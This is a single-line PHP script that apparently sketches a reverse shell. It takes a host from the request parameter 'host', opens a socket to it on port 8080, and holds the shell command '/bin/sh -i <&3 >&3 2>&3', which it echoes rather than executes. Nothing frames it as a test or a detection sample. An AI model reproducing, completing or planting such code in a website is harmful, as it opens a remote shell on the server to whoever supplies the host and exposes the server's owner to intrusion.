<?php $host = $_REQUEST["host"]; $s = fsockopen($host, 8080); $example = "/bin/sh -i <&3 >&3 2>&3"; echo $example;
